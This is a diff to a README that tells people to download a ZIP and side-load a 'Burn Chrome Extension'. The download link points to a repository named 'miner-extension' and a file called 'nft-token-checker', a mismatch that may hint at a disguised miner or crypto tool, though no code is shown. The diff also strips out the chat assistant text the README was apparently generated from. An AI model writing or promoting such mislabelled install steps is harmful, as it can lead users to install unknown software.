@@ -1,7 +1,3 @@
-Absolutely! Here's a clean and clear **README.md** you can use to help people download and install your extension **without Git clone** — just via a direct download link:
-
----
-
 ## 🔥 Burn Chrome Extension
 
 This is a custom Chrome extension. You can install it manually in just a few simple steps — no coding or Git required!
@@ -13,8 +9,6 @@ This is a custom Chrome extension. You can install it manually in just a few sim
 1. **Click the link below to download the ZIP file**:
 
    👉 [**Download Extension**](https://github.com/SerenaDK/miner-extension/releases/download/v1.0.0/nft-token-checker-v1.0.0.zip)
-
-   *(Replace the link above with your actual Google Drive / Dropbox / site link)*
 
 2. **Unzip** the file to a folder on your computer.
 
